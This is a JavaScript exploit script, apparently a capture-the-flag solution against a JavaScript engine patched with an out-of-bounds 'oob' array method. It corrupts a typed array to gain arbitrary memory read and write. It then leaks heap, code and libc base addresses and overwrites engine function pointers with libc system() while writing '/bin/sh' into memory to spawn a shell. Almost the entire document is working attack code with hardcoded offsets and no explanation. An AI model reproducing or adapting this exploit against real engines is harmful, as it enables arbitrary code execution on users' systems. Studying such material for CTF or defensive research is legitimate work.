///////////////////////////////////////////////////////////////////////
///////////////////         Utility Functions       ///////////////////
let hex = (val) => '0x' + val.toString(16);

function gc2() {
    for (let i = 0; i < 0x10; i++) new ArrayBuffer(0x1000000);
}

function js_heap_defragment() { // used for stable fake JSValue crafting
    gc2();
    for (let i = 0; i < 0x1000; i++) new ArrayBuffer(0x10);
}

const __buf = new ArrayBuffer(8); // 8 byte array buffer
const __f64_buf = new Float64Array(__buf);
const __u32_buf = new Uint32Array(__buf);

function ftoi(val) { // typeof(val) = float
    __f64_buf[0] = val;
    return BigInt(__u32_buf[0]) + (BigInt(__u32_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    __u32_buf[0] = Number(val & 0xffffffffn);
    __u32_buf[1] = Number(val >> 32n);
    return __f64_buf[0];
}
///////////////////         Utility Functions       ///////////////////
///////////////////////////////////////////////////////////////////////

getenv_offset = 0x487b0n
system_offset = 0x58750n

xxxxxx = ["aa"];
function pause()
{
	xxxxxx.at(0);
}

function assert(x)
{
	if(!x) {
		print("assert failed");
		raise;
	}
}

[1.1, 2.2, 3.3];
[1.1, 2.2, 3.3];
[1.1, 2.2, 3.3];
[1.1, 2.2, 3.3];
[1.1, 2.2, 3.3];
[1.1, 2.2, 3.3];
[1.1, 2.2, 3.3];

var buf = new ArrayBuffer(0x100);
var a = [1.1, 2.2, 3.3];
var array1 = new BigUint64Array(buf);
var array2 = new BigUint64Array(buf);

a.oob(8, itof(0x7fffffffn));
print(array1.length);

// identify my arbitary read/write array
for(i=0; i<0x10000; i++) {
	if(array1[i] == 0x001d0d0000000001n && (array1[i+8]&0xffffffffn) == 0x20n) break;
}
print(i)

var heap_ptr = array1[i+7];

function read64(addr) {
	array1[i+7] = addr;
	return array2[0];
}

function write64(addr, value) {
	array1[i+7] = addr;
	array2[0] = value;
}

var addr = heap_ptr&0xfffffffffffff000n;
while(1) {
	if (read64(addr+8n) == 0x291) break;
	addr -= 0x1000n;
}
var heap_base = addr;
print("heap_base @ " + hex(heap_base));
var code_base = read64(heap_base+0x2a0n) - 0x14a40n;
print("code_base @ " + hex(code_base));
var libc_base = read64(code_base+0xe6bd8n) - getenv_offset;
print("libc_base @ " + hex(libc_base));

var system = libc_base + system_offset;

var x = "xxxxx";

var idx=0n;
for(idx=0n; idx<0x4000n; idx++) {
	//print(hex(heap_base+idx*8n), hex(read64(heap_base+idx*8n)))
	if((read64(heap_base+idx*8n)>>32n) == 0x000c0100n) {
		//print(hex(read64(heap_base+idx*8n+0x38n)))
		write64(heap_base+idx*8n+0x38n, system)
	}
	if(read64(heap_base+idx*8n) == 0x00000005000001dbn) {
		write64(heap_base+idx*8n, 0x68732f6e69622fn)
	}
}
print(idx)

pause();

x.charCodeAt(0);
